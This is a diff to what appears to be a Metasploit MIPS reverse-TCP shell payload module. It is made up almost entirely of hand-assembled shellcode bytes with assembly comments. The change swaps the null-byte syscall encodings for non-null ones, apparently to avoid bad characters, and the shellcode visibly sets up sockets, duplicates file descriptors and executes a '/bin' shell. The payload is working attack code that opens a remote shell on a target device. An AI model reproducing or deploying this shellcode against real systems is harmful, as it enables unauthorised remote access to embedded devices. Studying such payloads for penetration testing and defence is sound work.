@@ -10,6 +10,7 @@
 ##
 
 # Written in a hurry using shellforge and my MIPS shellforge loader (avail. on cr0.org)
+# + Few removals of unneccessary zero bytes by kost
 
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
@@ -84,7 +85,7 @@ module Metasploit3
 			"\x02\x00\x05\x24" +                  # li	a1,2
 			"\x21\x30\x00\x00" +                  # move	a2,zero
 			"\x57\x10\x02\x24" +                  # li	v0,4183
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x21\x18\x40\x00" +                  # move	v1,v0
 			"\xff\xff\x02\x24" +                  # li	v0,-1
 			"\x1a\x00\x62\x10" +                  # beq	v1,v0,0xf4
@@ -93,29 +94,29 @@ module Metasploit3
 			"\x08\x00\xa5\x27" +                  # addiu	a1,sp,8
 			"\x10\x00\x06\x24" +                  # li	a2,16
 			"\x4a\x10\x02\x24" +                  # li	v0,4170
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x0e\x00\x40\x14" +                  # bnez	v0,0xe0
 			"\x21\x28\x00\x00" +                  # move	a1,zero
 			"\xdf\x0f\x02\x24" +                  # li	v0,4063
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x01\x00\x05\x24" +                  # li	a1,1
 			"\xdf\x0f\x02\x24" +                  # li	v0,4063
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x02\x00\x05\x24" +                  # li	a1,2
 			"\xdf\x0f\x02\x24" +                  # li	v0,4063
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x21\x30\x00\x00" +                  # move	a2,zero
 			"\x21\x20\x20\x03" +                  # move	a0,t9
 			"\x20\x00\xa5\x27" +                  # addiu	a1,sp,32
 			"\xab\x0f\x02\x24" +                  # li	v0,4011
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x21\x20\x00\x00" +                  # move	a0,zero
 			"\xa1\x0f\x02\x24" +                  # li	v0,4001
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\x08\x00\xe0\x03" +                  # jr	ra
 			"\x28\x00\xbd\x27" +                  # addiu	sp,sp,40
 			"\xa1\x0f\x02\x24" +                  # li	v0,4001
-			"\x0c\x00\x00\x00" +                  # syscall
+			"\x0c\x01\x01\x01" +                  # syscall
 			"\xe5\xff\x00\x10" +                  # b	0x94
 			"\x21\x20\x60\x00" +                  # move	a0,v1
 			"\x2f\x62\x69\x6e" +                  # "/bin"
